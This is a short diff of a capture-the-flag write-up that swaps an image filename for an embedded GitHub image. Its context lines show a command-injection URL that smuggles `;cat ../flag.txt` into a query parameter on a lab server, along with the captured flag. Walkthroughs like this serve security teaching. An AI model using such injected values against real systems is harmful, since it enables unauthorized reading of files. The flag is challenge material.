@@ -38,7 +38,8 @@ After exploring the file structure I eventually retrieved the flag with:
 
 `3.105.27.130:9001/pretty?format=';cat ../flag.txt'`
 
-commandinject.png
+<img width="647" height="72" alt="commandinject" src="https://github.com/user-attachments/assets/55de4472-5c31-4087-b9c6-de93924f520a" />
+
 
 `secedu{th3re_is_4lways_a_t1me_&_plac3_to_bre4k_0u7}`
 
